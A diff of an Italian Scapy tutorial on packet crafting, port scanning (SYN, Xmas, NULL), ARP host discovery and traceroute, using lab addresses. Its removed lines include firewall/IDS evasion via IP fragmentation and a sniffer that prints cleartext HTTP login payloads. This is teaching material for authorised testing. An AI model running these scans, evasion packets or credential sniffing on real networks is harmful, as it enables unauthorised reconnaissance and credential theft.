@@ -1,9 +1,7 @@
 ---
-title: 'Scapy Python: Packet Crafting, Sniffing e ARP Spoofing'
+title: 'Scapy Python: Packet Crafting, Sniffing e ARP Spoofing '
 slug: scapy
-description: >-
-  Impara Scapy con Python per creare e analizzare pacchetti TCP, UDP, ICMP e
-  ARP, eseguire SYN scan, sniffing, ARP spoofing e testare firewall e IDS.
+description: 'Impara Scapy in Python per il pentest: installazione, packet crafting, sniffer con filtri BPF, SYN scan, analisi PCAP e ARP spoofing con esempi pratici.'
 image: /scapy-python-packet-crafting-pentest.webp
 draft: false
 date: 2026-08-20T00:00:00.000Z
@@ -21,487 +19,783 @@ tags:
   - Firewall Evasion
 ---
 
-# Scapy: Packet Crafting con Python per Pentest, Firewall Evasion e ARP Spoofing
+# Scapy: guida completa a Python, packet crafting, sniffing e analisi dei pacchetti
 
-**Scapy è una libreria Python per il packet crafting**: permette di costruire, inviare, catturare e analizzare pacchetti di rete campo per campo (Ethernet, IP, TCP, UDP, ICMP, ARP e altri), invece di affidarsi alle opzioni già decise da un tool come Nmap o Wireshark. Rientra nella stessa categoria di raw socket Python e strumenti di network programming, ma con un livello di controllo che nessun tool a riga di comando offre.
+Scapy è una libreria Python che ti fa costruire, inviare, catturare e leggere pacchetti di rete un campo alla volta. Con Scapy in Python scrivi in tre righe quello che con altri strumenti richiede un programma intero: un ping, una scansione di porte, uno sniffer di pacchetti o un attacco ARP in laboratorio.
 
-**Prima di iniziare, ti serve:**
+Questo tutorial Scapy parte dall'installazione di Scapy su Kali Linux, Linux, Windows e macOS e arriva a packet crafting, scansioni, sniffing con filtri BPF, file PCAP, ARP spoofing in laboratorio e difesa. Se vuoi subito provare tutto senza toccare nessuna rete, vai al [laboratorio locale con Scapy](#laboratorio-locale-con-scapy).
 
-* Python 3 installato
-* Linux (consigliato) o Windows con driver Npcap
-* privilegi elevati per la maggior parte delle operazioni (root su Linux, prompt amministratore su Windows)
-* una rete di laboratorio (VM, HTB, VulnLab) — mai una rete che non gestisci
-* basi di TCP/IP: cosa sono IP, porte, three-way handshake
+***
 
-In questo articolo vedrai:
+## Cos'è Scapy e a cosa serve
 
-* come installare Scapy e i requisiti per usarlo
-* come esplorare i protocolli e ispezionare un pacchetto con `ls()`, `show()`, `summary()` e `hexdump()`
-* come inviare un ping ICMP, fare un TCP SYN scan e costruire pacchetti UDP, ARP, IPv6
-* come usare `srp()` per un host discovery via ARP su tutta una subnet
-* come usare frammentazione e combinazioni di flag TCP per aggirare firewall e IDS — e come un IDS se ne accorge
-* come catturare pacchetti (con filtri BPF) e fare ARP spoofing completo, con forwarding e sniffing delle credenziali
-* come salvare e riaprire catture in formato PCAP
-* dove si colloca Scapy in un workflow di pentest reale, quando conviene usare Nmap o Wireshark al suo posto, e gli errori più comuni di chi inizia
+Scapy è un programma e una libreria Python per la manipolazione dei pacchetti di rete. Il progetto è open source e vive su [GitHub (secdev/scapy)](https://github.com/secdev/scapy). La documentazione Scapy ufficiale è su [scapy.readthedocs.io](https://scapy.readthedocs.io/).
 
-## Cos'è Scapy e perché è diverso da Nmap, Wireshark, hping3
+La differenza con gli altri strumenti è una sola: **tu decidi ogni campo del pacchetto**. Nmap sceglie per te i pacchetti, Wireshark li legge e basta. Scapy li costruisce, li manda, legge la risposta e ti lascia il risultato come oggetto Python, pronto da usare in uno script.
 
-Ogni volta che due computer comunicano, si scambiano dati incapsulati a livelli: un frame Ethernet contiene un pacchetto IP, che contiene un pacchetto TCP (o UDP, o ICMP), un po' come buste una dentro l'altra. Nmap, hping, Wireshark leggono e costruiscono queste buste per te, con logiche già decise da chi li ha scritti.
+Il significato di `packet crafting` è: costruire a mano un pacchetto di rete, campo per campo.
 
-Scapy ti dà lo stesso potere ma a livello di singolo campo, dentro uno script Python: decidi tu il flag TCP, il TTL, la frammentazione, l'ordine dei livelli. Questo lo rende più lento e meno pratico per un lavoro di routine, ma insostituibile quando devi capire *esattamente* cosa succede in un pacchetto, o costruire qualcosa che un tool pronto non prevede.
+| Strumento                                           | Cosa fa meglio                                                  | Limite                           |
+| --------------------------------------------------- | --------------------------------------------------------------- | -------------------------------- |
+| Scapy                                               | Pacchetti costruiti a mano, protocolli strani, script su misura | Lento su scansioni grandi        |
+| [Nmap](https://hackita.it/articoli/nmap/)           | Scansioni di porte veloci e complete                            | Pacchetti decisi dal programma   |
+| [Wireshark](https://hackita.it/articoli/wireshark/) | Analisi visuale di una cattura                                  | Non invia pacchetti              |
+| [tcpdump](https://hackita.it/articoli/tcpdump/)     | Cattura veloce da terminale                                     | Non costruisce pacchetti         |
+| hping3                                              | Test rapidi con TCP, UDP e ICMP                                 | Meno flessibile, un solo comando |
 
-## Installazione e permessi necessari
+In un pentest Scapy serve quando gli altri strumenti non bastano: un protocollo che non conosce nessuno, un firewall da testare con pacchetti strani, una rete dove puoi mandare solo un tipo di traffico. Per il contesto generale dello sniffing vedi anche [Sniffing](https://hackita.it/articoli/sniffing/).
+
+***
+
+## Installare Scapy: Kali Linux, Linux, Windows e macOS
+
+L'installazione di Scapy cambia in base al sistema. Dopo l'installazione verifichi sempre con la stessa riga.
+
+**Scapy su Kali Linux (di solito è già incluso, altrimenti):**
 
 ```bash
+sudo apt update
+sudo apt install python3-scapy
+```
+
+**Linux con pip (consigliato dentro un ambiente virtuale):**
+
+```bash
+python3 -m venv scapy-env
+source scapy-env/bin/activate
 pip install scapy
+```
 
-# Su Kali/Debian, alternativa via pacchetto di sistema
-sudo apt install python3-scapy -y
+Su Kali e Debian recenti `pip install` fuori da un ambiente virtuale viene bloccato dal sistema. Per questo si usa `venv` oppure `apt`.
 
-# Verifica versione installata
+**Windows:** installa prima Npcap da [nmap.org/npcap](https://nmap.org/npcap/), poi Scapy.
+
+```powershell
+pip install scapy
+```
+
+Npcap è il driver che permette a Scapy di catturare e inviare pacchetti. Senza Npcap lo sniffing non funziona. Se hai già Wireshark, Npcap c'è già.
+
+**macOS:**
+
+```bash
+pip3 install scapy
+```
+
+**Download di Scapy dal sorgente (GitHub):**
+
+```bash
+git clone https://github.com/secdev/scapy.git
+cd scapy
+pip install .
+```
+
+**Verifica dell'installazione:**
+
+```bash
 python3 -c "import scapy; print(scapy.__version__)"
 ```
 
-Scapy lavora con socket "raw", cioè accede direttamente all'interfaccia di rete bypassando (per queste operazioni) lo stack normale del sistema operativo. Questo richiede privilegi elevati per la maggior parte delle operazioni di invio, sniffing e accesso ai raw socket:
+Se stampa un numero di versione, Scapy è installato. Per avviare la shell interattiva:
 
 ```bash
-sudo python3
+sudo scapy
 ```
 
-oppure esegui lo script intero con `sudo` davanti. Su Windows serve un prompt con privilegi di amministratore e il driver Npcap installato.
+Servono i privilegi di root (su Windows, un terminale avviato come amministratore) perché Scapy scrive pacchetti grezzi sulla scheda di rete.
 
-## Sintassi base di Scapy
+***
 
-Prima degli esempi pratici, la struttura che userai in ogni script: i protocolli si impilano con `/`, dal livello più basso al più alto.
+## Scapy in Python: primi comandi
+
+Puoi usare Scapy in due modi: la shell interattiva (`sudo scapy`) per provare, oppure uno script Python con `from scapy.all import *` per automatizzare.
+
+La regola base è una: **i protocolli si impilano con lo slash `/`**, dal livello più basso al più alto.
 
 ```python
-Layer 2 → Ether()
-Layer 3 → IP()
-Layer 4 → TCP() / UDP() / ICMP()
-Payload → Raw()
+from scapy.all import IP, TCP
+
+packet = IP(dst="192.168.56.101") / TCP(dport=80, flags="S")
+packet.show()
 ```
+
+Questo è un pacchetto IP con dentro un segmento TCP verso la porta 80, con il flag SYN. Tutti i campi che non scrivi, Scapy li compila con un valore di default.
+
+Comandi che userai di continuo:
+
+| Comando               | Cosa fa                                                       |
+| --------------------- | ------------------------------------------------------------- |
+| `ls()`                | Elenca tutti i protocolli che Scapy conosce                   |
+| `ls(IP)`              | Mostra tutti i campi di un protocollo e i valori di default   |
+| `lsc()`               | Elenca tutte le funzioni di Scapy                             |
+| `pacchetto.show()`    | Mostra il pacchetto campo per campo                           |
+| `pacchetto.show2()`   | Come `show()`, ma con i campi calcolati (checksum, lunghezza) |
+| `pacchetto.summary()` | Una riga che riassume il pacchetto                            |
+| `hexdump(pacchetto)`  | I byte del pacchetto in esadecimale                           |
+| `raw(pacchetto)`      | I byte del pacchetto come oggetto Python                      |
+
+I valori di default sono utili da conoscere. Un `TCP()` senza argomenti ha porta sorgente 20, porta destinazione 80, finestra 8192 e flag S. Lo vedremo anche nella parte difensiva, perché questi valori sono un segnale per chi analizza il traffico.
+
+***
+
+## Livelli (layers) e protocolli di rete in Scapy
+
+Scapy ragiona a strati, come il modello ISO/OSI. Per ogni livello c'è una classe Python.
+
+| Classe         | Livello | Cosa rappresenta                                                                              |
+| -------------- | ------- | --------------------------------------------------------------------------------------------- |
+| `Ether`        | 2       | Frame Ethernet con MAC sorgente e destinazione                                                |
+| `ARP`          | 2/3     | Richieste e risposte ARP                                                                      |
+| `IP`           | 3       | Intestazione IPv4 ([IP Internet Protocol](https://hackita.it/articoli/ip-internet-protocol/)) |
+| `IPv6`         | 3       | Intestazione IPv6 ([IPv4 e IPv6](https://hackita.it/articoli/ipv4-ipv6/))                     |
+| `ICMP`         | 3       | Ping e messaggi di errore ([ICMP](https://hackita.it/articoli/icmp/))                         |
+| `TCP`          | 4       | Segmento TCP con flag e numeri di sequenza                                                    |
+| `UDP`          | 4       | Datagramma UDP                                                                                |
+| `DNS`, `DNSQR` | 7       | Query e risposte DNS ([DNS](https://hackita.it/articoli/dns/))                                |
+| `Raw`          | 7       | Dati grezzi (il payload)                                                                      |
+
+Se non scrivi il livello `Ether`, Scapy lo aggiunge da solo con il MAC giusto quando usi le funzioni di livello 3. Se lavori al livello 2 (`sendp`, `srp`) lo scrivi tu.
+
+***
+
+## Packet crafting con Scapy: TCP, UDP, ICMP e DNS
+
+Ecco i pacchetti più usati. Sono solo costruiti, non ancora inviati.
 
 ```python
-from scapy.all import IP, TCP, Ether
+from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, Raw
 
-IP(dst="192.168.1.10")                          # solo layer 3
-IP(dst="192.168.1.10") / TCP(dport=80, flags="S")   # layer 3 + 4
-Ether() / IP(dst="192.168.1.10") / TCP(dport=80)     # layer 2 + 3 + 4
+target = "192.168.56.101"
+
+# TCP SYN to port 443
+tcp_syn = IP(dst=target) / TCP(dport=443, flags="S")
+
+# UDP packet with a payload
+udp_packet = IP(dst=target) / UDP(sport=4444, dport=5353) / Raw(b"hello")
+
+# ICMP echo request (ping)
+ping = IP(dst=target) / ICMP()
+
+# DNS query for the A record of example.com
+dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com", qtype="A"))
 ```
 
-Ogni oggetto costruito così (`IP()`, `TCP()`, un `IP()/TCP()` combinato) è un normale oggetto Python: puoi ispezionarlo, modificarlo campo per campo, o passarlo a `send()`/`sr1()` per spedirlo.
-
-## Prima di costruire pacchetti: esplora i protocolli con `ls()` e `show()`
-
-Prima ancora degli esempi pratici, vale la pena conoscere gli strumenti che Scapy offre per **esplorare** cosa stai costruendo — altrimenti "campo per campo" resta solo uno slogan.
+La packet manipulation, cioè la modifica di un pacchetto già costruito o catturato, è semplice: per cambiare un campo, basta riscriverlo. Per leggerne uno, usi il nome del livello tra parentesi quadre:
 
 ```python
-from scapy.all import ls, IP, TCP
-
-ls(TCP)          # elenca tutti i campi disponibili nel protocollo TCP, coi valori di default
+tcp_syn[TCP].dport = 8443
+print(tcp_syn[IP].dst)
 ```
 
-`ls()` ti mostra ogni campo che un protocollo supporta (flag, opzioni, campi meno comuni che nessun tutorial menziona). È il modo più veloce per scoprire come costruire un pacchetto non standard, senza dover cercare la documentazione ogni volta.
+**Inviare una query DNS con Scapy e leggere la risposta:**
 
 ```python
-pkt = IP(dst="1.1.1.1") / TCP(dport=443, flags="S")
-pkt.show()       # struttura leggibile del pacchetto, livello per livello
-pkt.show2()      # come show(), ma forza il calcolo dei campi automatici (es. checksum)
-pkt.summary()    # riepilogo su una riga, utile quando ne ispezioni tanti in sequenza
+from scapy.all import IP, UDP, DNS, DNSQR, sr1
+
+reply = sr1(IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com")), timeout=2, verbose=0)
+
+if reply is not None and reply.haslayer(DNS):
+    for answer in reply[DNS].an or []:
+        print(answer.rdata)
 ```
 
-La differenza tra `show()` e `show2()` conta più di quanto sembri: Scapy calcola alcuni campi — come i checksum di IP e TCP — solo al momento dell'invio, non quando costruisci il pacchetto. `show()` prima dell'invio può mostrarti un checksum vuoto o `None`; `show2()` forza quel calcolo, utile in fase di debug quando un pacchetto "sembra giusto" ma il target lo scarta silenziosamente.
+**Flag TCP in Scapy.** Si scrivono come lettere: `S` SYN, `A` ACK, `F` FIN, `R` RST, `P` PSH, `U` URG. Si combinano: `"SA"` è SYN più ACK, `"FPU"` è la combinazione Xmas.
 
-Per un'ispezione byte per byte, invece della struttura leggibile:
+***
 
-```python
-from scapy.all import hexdump
+## Inviare pacchetti con Scapy: send, sendp, sr, sr1 e srp
 
-hexdump(pkt)   # dump esadecimale del pacchetto, campo per campo a livello di bit
-```
+Scapy ha quattro funzioni principali per inviare. La scelta dipende da due domande: lavori al livello 2 o al livello 3? Vuoi la risposta?
 
-**Quale interfaccia sto usando davvero?** Su una macchina con più interfacce (Wi-Fi, Ethernet, VPN — tipico quando sei connesso alla VPN di HackTheBox o VulnLab), Scapy sceglie l'interfaccia in base alla tabella di routing del sistema, che puoi ispezionare direttamente:
+| Funzione  | Livello | Aspetta la risposta? | Quando si usa                               |
+| --------- | ------- | -------------------- | ------------------------------------------- |
+| `send()`  | 3       | No                   | Mandare e basta (flood, spoofing)           |
+| `sendp()` | 2       | No                   | Mandare con il frame Ethernet scritto da te |
+| `sr()`    | 3       | Sì, tutte            | Più pacchetti, più risposte (scansioni)     |
+| `sr1()`   | 3       | Sì, la prima         | Un pacchetto, una risposta (ping, DNS)      |
+| `srp()`   | 2       | Sì, tutte            | Scansione ARP                               |
+| `srp1()`  | 2       | Sì, la prima         | Una richiesta ARP                           |
 
-```python
-from scapy.all import conf, get_if_list
-
-get_if_list()   # elenco grezzo delle interfacce disponibili sul sistema
-conf.ifaces     # elenco delle interfacce che Scapy vede, con più dettaglio
-conf.iface      # interfaccia di default che Scapy userebbe ora
-conf.route      # tabella di routing usata per decidere da dove escono i pacchetti
-```
-
-Se un pacchetto sembra non arrivare mai a destinazione durante un lab con VPN, il primo sospetto è quasi sempre questo: Scapy sta uscendo dall'interfaccia sbagliata, non dal tunnel.
-
-## Scapy vs Nmap vs Wireshark vs hping3: quando usare cosa
-
-Una domanda che si pone quasi chiunque inizi: se esistono già Nmap, Wireshark e hping3, perché imparare anche Scapy? Perché ognuno risolve un problema diverso:
-
-| Strumento     | Ideale per                                                                                 |
-| ------------- | ------------------------------------------------------------------------------------------ |
-| **Scapy**     | Packet crafting su misura, pacchetti che nessun tool prevede, capire un protocollo a fondo |
-| **Nmap**      | Port scan veloce e maturo su larga scala                                                   |
-| **Wireshark** | Analisi visiva del traffico catturato                                                      |
-| **tcpdump**   | Cattura da riga di comando, leggera, su server senza interfaccia grafica                   |
-| **hping3**    | Test TCP mirati da riga di comando, senza scrivere codice                                  |
-| **masscan**   | Scansione massiva di migliaia di porte/IP in pochi secondi                                 |
-
-In pratica: usi Nmap per scoprire, Wireshark per guardare, e Scapy quando devi **costruire** qualcosa che gli altri due non prevedono — o capire davvero perché un pacchetto si comporta in un certo modo.
-
-## Ethernet, IP e le funzioni di invio: le basi che contano davvero
-
-Prima degli esempi, due concetti che quasi tutti i tutorial di Scapy saltano — e che sono il motivo per cui il primo script di chiunque spesso non funziona.
-
-**Il livello Ethernet (`Ether()`).** Le funzioni `send()` e `sr1()` lavorano a livello 3 (IP): Scapy si occupa lui di trovare il MAC di destinazione tramite il routing del sistema. Ma su una rete locale, se hai bisogno di controllare tu il livello 2 (per esempio in un attacco ARP, o per inviare su un'interfaccia specifica), devi costruire anche il frame Ethernet e usare le funzioni "p" (packet, livello 2):
-
-```python
-from scapy.all import Ether, ARP, sendp
-
-frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.1")
-sendp(frame, iface="eth0")
-```
-
-`sendp()` invia a livello 2 e richiede che tu specifichi il livello Ethernet; `send()` lavora a livello 3 e ci pensa il sistema a incapsulare. Confonderli è la causa più comune di "il mio script non manda niente".
-
-**`send()`/`sendp()` vs `sr1()`/`sr()`/`srp()`.** `send()` e `sendp()` spediscono e basta, senza aspettare risposta — utili per flussi continui come lo spoofing ARP. `sr1()` invia e aspetta **una sola** risposta; `sr()` invia (anche più pacchetti insieme, a livello 3) e raccoglie tutte le risposte, restituendo coppie richiesta/risposta. `srp()` fa lo stesso ma a livello 2 — è la funzione che usi tipicamente per un host discovery ARP su una subnet intera, dove serve controllare anche il frame Ethernet:
-
-```python
-from scapy.all import Ether, ARP, srp
-
-# Host discovery: chi risponde su tutta la subnet?
-risposte, non_risposte = srp(
-    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.0/24"),
-    timeout=2,
-    verbose=False
-)
-
-for inviato, ricevuto in risposte:
-    print(ricevuto[ARP].psrc, ricevuto[Ether].src)
-```
-
-Questo è l'equivalente Scapy di un ARP scan: manda una richiesta broadcast a tutta la subnet e raccoglie chi risponde, con IP e MAC — utile come primo passo di recon su una rete locale prima ancora di lanciare Nmap.
-
-**Per la scansione di più pacchetti insieme, `sr()`/`srp()` sono più efficienti di un ciclo di `sr1()`.**
-
-**Il timeout è obbligatorio, non opzionale.** Se il target non risponde (porta filtrata, firewall silenzioso), `sr1()` senza timeout resta bloccato all'infinito aspettando un pacchetto che non arriverà mai:
-
-```python
-risposta = sr1(pacchetto, timeout=2)
-if risposta is None:
-    print("Nessuna risposta")
-```
-
-Mettilo sempre, fin dal primo script.
-
-## Come inviare un ping ICMP con Scapy
+Esempio con `sr1()`: un ping.
 
 ```python
 from scapy.all import IP, ICMP, sr1
 
-pacchetto = IP(dst="8.8.8.8") / ICMP()
-risposta = sr1(pacchetto, timeout=2)
-if risposta:
-    risposta.show()
+reply = sr1(IP(dst="192.168.56.101") / ICMP(), timeout=2, verbose=0)
+
+if reply is None:
+    print("no reply")
+else:
+    print(reply.summary())
 ```
 
-Il simbolo `/` impacchetta un livello dentro l'altro: qui l'ICMP dentro l'IP. `risposta.show()` stampa ogni campo del pacchetto ricevuto — il modo più diretto per vedere davvero com'è fatto un pacchetto IP/ICMP, invece di leggerlo solo su un diagramma.
+Opzioni utili per tutte le funzioni di invio:
 
-## Come fare un TCP SYN scan con Scapy
+| Opzione        | Significato                                                                                        |
+| -------------- | -------------------------------------------------------------------------------------------------- |
+| `timeout=2`    | Dopo quanti secondi smettere di aspettare. **Mettilo sempre**, altrimenti lo script resta bloccato |
+| `verbose=0`    | Niente output di Scapy                                                                             |
+| `count=5`      | Manda il pacchetto 5 volte (solo `send`/`sendp`)                                                   |
+| `inter=0.5`    | Pausa in secondi tra un pacchetto e l'altro                                                        |
+| `iface="eth0"` | Scheda di rete da usare                                                                            |
+| `retry=2`      | Quante volte rimandare se non risponde nessuno                                                     |
+
+`sr()` ritorna due liste: i pacchetti con risposta e quelli senza. Ogni elemento della prima è una coppia (inviato, ricevuto):
 
 ```python
-from scapy.all import IP, TCP, sr1
+answered, unanswered = sr(IP(dst="192.168.56.101") / TCP(dport=[22, 80, 443], flags="S"), timeout=2, verbose=0)
 
-pacchetto = IP(dst="192.168.1.10") / TCP(dport=80, flags="S")
-risposta = sr1(pacchetto, timeout=2)
-
-if risposta and risposta.haslayer(TCP):
-    if risposta[TCP].flags == "SA":
-        print("Porta aperta")
-    elif risposta[TCP].flags == "RA":
-        print("Porta chiusa")
+for sent, received in answered:
+    print(sent[TCP].dport, received[TCP].flags)
 ```
 
-`flags="S"` è il flag SYN, quello che apre una connessione. Se la porta è aperta il target risponde `SA` (SYN-ACK); se è chiusa risponde `RA` (RST-ACK). Non completiamo mai la connessione con il terzo ACK — per questo si chiama half-open scan, ed è generalmente meno rumoroso di una connessione TCP piena, perché molti log applicativi registrano solo le connessioni portate a termine (un IDS di rete, invece, lo vede comunque passare).
+***
 
-C'è però un dettaglio che quasi nessun tutorial menziona: quando il target risponde con `SA`, è il **tuo stesso kernel Linux** — non lo script — a rispondere con un RST, perché non sa nulla di questa connessione avviata "a mano" da Scapy. Questo può disturbare lo scan o rivelarlo. Per evitarlo, molti bloccano temporaneamente l'invio di RST in uscita verso il target:
+## Ping, traceroute e IPv6 con Scapy
 
-```bash
-sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
-```
-
-Da rimuovere finita la sessione di test, ovviamente.
-
-## UDP: il protocollo che quasi tutti dimenticano
-
-Tra i tutorial di Scapy in giro, quasi tutti si fermano a TCP e ICMP, ma buona parte dei servizi interessanti in un pentest gira su UDP: DNS, SNMP, TFTP, molti protocolli di discovery.
+**Ping a una rete intera:**
 
 ```python
-from scapy.all import IP, UDP, sr1
+from scapy.all import IP, ICMP, sr
 
-pacchetto = IP(dst="192.168.1.10") / UDP(dport=161)   # 161 = SNMP
-risposta = sr1(pacchetto, timeout=2)
+answered, _ = sr(IP(dst="192.168.56.0/24") / ICMP(), timeout=2, verbose=0)
+
+for sent, received in answered:
+    print(received[IP].src, "is up")
 ```
 
-A differenza di TCP, UDP non ha un handshake: se non arriva nessuna risposta, può voler dire porta chiusa **oppure** porta aperta ma il servizio non risponde a un pacchetto vuoto — con UDP serve quasi sempre costruire un payload minimamente valido per quel protocollo specifico (una query DNS vera, un pacchetto SNMP con community string) per ottenere una risposta utile.
+**Traceroute fatto a mano.** Si manda un pacchetto con TTL 1, poi 2, poi 3. Ogni router che scarta il pacchetto risponde e rivela il proprio indirizzo.
 
-## Un accenno a IPv6
+```python
+from scapy.all import IP, ICMP, sr1
 
-Molte reti aziendali hanno IPv6 attivo per default, anche quando chi le amministra pensa di averlo disabilitato — e uno scanner che guarda solo IPv4 si perde quel pezzo di superficie d'attacco. Scapy supporta IPv6 e ICMPv6 allo stesso modo:
+for ttl in range(1, 15):
+    reply = sr1(IP(dst="8.8.8.8", ttl=ttl) / ICMP(), timeout=2, verbose=0)
+    if reply is None:
+        print(ttl, "*")
+        continue
+    print(ttl, reply[IP].src)
+    if reply[ICMP].type == 0:
+        break
+```
+
+Scapy ha anche il comando pronto `traceroute("8.8.8.8")`.
+
+**IPv6 e ICMPv6:**
 
 ```python
 from scapy.all import IPv6, ICMPv6EchoRequest, sr1
 
-pacchetto = IPv6(dst="fe80::1") / ICMPv6EchoRequest()
-risposta = sr1(pacchetto, timeout=2)
+reply = sr1(IPv6(dst="::1") / ICMPv6EchoRequest(), timeout=2, verbose=0)
+print(reply.summary() if reply else "no reply")
 ```
 
-Non è un dettaglio da manuale: un servizio che pensavi raggiungibile solo su IPv4 potrebbe rispondere anche in IPv6, aprendo un percorso che il firewall filtra diversamente (o non filtra affatto).
+***
 
-## Scapy per Testare Firewall e IDS
+## Port scanning con Scapy: SYN scan
 
-Le tecniche di evasione qui sotto vanno usate esclusivamente in assessment autorizzati o in lab — è l'uso di Scapy che nessun altro tool sostituisce davvero: costruire pacchetti pensati per **confondere** un dispositivo di sicurezza, non solo per raggiungere un target.
-
-**Frammentazione IP.** Alcuni firewall ispezionano solo il primo frammento di un pacchetto diviso, lasciando passare il resto senza controllo. Puoi dividere manualmente un pacchetto in due frammenti IP:
+Il port scanning con Scapy ti fa capire come funziona davvero una scansione. Lo SYN scan manda un SYN e legge cosa torna indietro.
 
 ```python
-from scapy.all import IP, TCP, Raw, send
+from scapy.all import IP, TCP, sr
 
-pacchetto = IP(dst="192.168.1.10", flags="MF", frag=0) / TCP(dport=80, flags="S")
-secondo_frammento = IP(dst="192.168.1.10", frag=1) / Raw(load="dati residui")
+target = "192.168.56.101"
+ports = [21, 22, 80, 443, 3306, 8080]
 
-send(pacchetto)
-send(secondo_frammento)
+answered, _ = sr(IP(dst=target) / TCP(dport=ports, flags="S"), timeout=2, verbose=0)
+
+for sent, received in sorted(answered, key=lambda pair: pair[0][TCP].dport):
+    if received.haslayer(TCP) and received[TCP].flags == 0x12:
+        print(f"{sent[TCP].dport}/tcp open")
 ```
 
-`flags="MF"` (More Fragments) dice che seguono altri pezzi; `frag=1` indica l'offset del secondo frammento. Un firewall che valuta solo il primo pezzo può non vedere mai l'intestazione TCP completa.
+Come leggere la risposta:
 
-**TTL basso per mappare cosa c'è dietro un firewall.** Ogni router che il pacchetto attraversa decrementa il TTL di 1; a zero il pacchetto scade e il router risponde con un errore ICMP "time exceeded". Giocando con il TTL (lo stesso principio di `traceroute`) capisci quanti hop separano te dal target, e puoi far scadere apposta un pacchetto su un segmento specifico invece di raggiungere l'host finale — utile per non far notare la scansione al sistema di sicurezza più vicino al bersaglio vero.
+| Cosa torna       | Significato                                   |
+| ---------------- | --------------------------------------------- |
+| SYN-ACK (`0x12`) | Porta aperta                                  |
+| RST-ACK (`0x14`) | Porta chiusa                                  |
+| Niente           | Porta filtrata da un firewall (o host spento) |
+| ICMP tipo 3      | Firewall che rifiuta in modo esplicito        |
 
-**Combinazioni di flag TCP anomale.** Nmap le implementa già (`-sX`, `-sN`, `-sF`), ma capire cosa fanno aiuta a interpretare i risultati:
+Altre scansioni si fanno cambiando i flag:
 
-```python
-from scapy.all import IP, TCP, sr1
+| Scansione | Flag                | Porta chiusa risponde | Porta aperta risponde                        |
+| --------- | ------------------- | --------------------- | -------------------------------------------- |
+| SYN       | `S`                 | RST                   | SYN-ACK                                      |
+| FIN       | `F`                 | RST                   | Niente                                       |
+| NULL      | nessuno (`flags=0`) | RST                   | Niente                                       |
+| Xmas      | `FPU`               | RST                   | Niente                                       |
+| ACK       | `A`                 | RST                   | RST (serve a mappare le regole del firewall) |
 
-# Xmas scan: FIN + PSH + URG accesi insieme — combinazione che non esiste in un handshake normale
-pacchetto = IP(dst="192.168.1.10") / TCP(dport=80, flags="FPU")
-risposta = sr1(pacchetto, timeout=2)
+FIN, NULL e Xmas funzionano solo su sistemi che seguono alla lettera lo standard (Linux e BSD). Windows risponde RST sempre.
+
+**Un dettaglio che frega tutti.** Scapy manda il SYN, ma il sistema operativo non sa di averlo mandato. Quando arriva il SYN-ACK, il kernel risponde da solo con un RST e chiude la connessione. Per una scansione va bene. Se invece vuoi fare un handshake a mano devi bloccare gli RST del kernel:
+
+```bash
+sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.56.101 -j DROP
 ```
 
-Un sistema TCP/IP a norma RFC 793 non dovrebbe rispondere nulla se la porta è aperta, e un RST se è chiusa — un comportamento diverso da quello di un SYN scan classico, che alcuni firewall stateful non filtrano allo stesso modo perché non riconoscono l'inizio di una connessione "regolare". Questo genere di test si chiama **ACL mapping**: capire, pacchetto per pacchetto, quali regole ha davvero un firewall, non quali dichiara di avere.
+Alla fine togli la regola con lo stesso comando, cambiando `-A` in `-D`.
 
-### Come un IDS individua questi tentativi
+Per scansioni vere usa [Nmap](https://hackita.it/articoli/nmap/): Scapy qui serve per capire e per i casi strani. Per le porte più comuni vedi [Porte TCP e UDP nel pentest](https://hackita.it/articoli/porte-tcp-udp-pentest/).
 
-Vale la pena conoscere anche il lato difensivo, perché aiuta a capire quanto queste tecniche siano davvero "invisibili" (spoiler: sempre meno). Un sistema di detection come Suricata o Zeek segnala tipicamente:
+***
 
-* combinazioni di flag TCP che non esistono in un traffico normale (Xmas, NULL scan)
-* frammentazione IP anomala o frammenti che si sovrappongono
-* TTL incoerente rispetto al resto del traffico dalla stessa sorgente
-* pattern di scansione lenti e distribuiti su molte porte, pensati apposta per restare sotto soglia — ma comunque riconoscibili su una finestra temporale più ampia
+## Network scanning con Scapy: scoprire gli host con ARP
 
-Una regola Snort/Suricata di base per un Xmas scan, giusto per farsi un'idea di come si scrive, controlla semplicemente la combinazione di flag `FIN,PSH,URG` attivi insieme su un pacchetto TCP. Sapere questo non deve scoraggiarti dal provare queste tecniche in lab: serve a darti aspettative realistiche su quanto siano "rumorose" in un ambiente monitorato bene.
-
-## Packet Sniffing e PCAP
-
-Oltre a costruire pacchetti, Scapy li sa anche catturare e analizzare, in modo programmabile, con filtri BPF (Berkeley Packet Filter) — la stessa sintassi che useresti con tcpdump:
-
-| Filtro              | Significato                         |
-| ------------------- | ----------------------------------- |
-| `tcp`               | solo traffico TCP                   |
-| `udp`               | solo traffico UDP                   |
-| `icmp`              | solo traffico ICMP                  |
-| `port 80`           | traffico da/verso la porta 80       |
-| `tcp port 443`      | solo TCP sulla porta 443 (HTTPS)    |
-| `host 192.168.1.10` | traffico da/verso un host specifico |
-| `arp`               | solo traffico ARP                   |
+Nella stessa rete locale, ARP è il metodo più affidabile per trovare gli host: nessun firewall blocca le richieste ARP, perché senza ARP la rete non funziona.
 
 ```python
-from scapy.all import sniff, Raw, TCP
+from scapy.all import Ether, ARP, srp
 
-def analizza(pkt):
-    if pkt.haslayer(Raw) and pkt.haslayer(TCP) and pkt[TCP].dport == 80:
-        payload = pkt[Raw].load
-        if b"password" in payload.lower() or b"user" in payload.lower():
-            print(payload)
+answered, _ = srp(
+    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.56.0/24"),
+    timeout=2,
+    verbose=0,
+)
 
-sniff(filter="tcp port 80", prn=analizza, store=False)
+for sent, received in answered:
+    print(received[ARP].psrc, received[Ether].src)
 ```
 
-`pkt[Raw].load` è il payload grezzo del pacchetto: su traffico HTTP non cifrato, spesso contiene form di login in chiaro. È lo stesso motivo per cui HTTPS esiste — ma su una rete di lab dove hai intercettato traffico non cifrato (vedi sezione successiva), questo genere di script rende visibile un problema che a parole resta astratto.
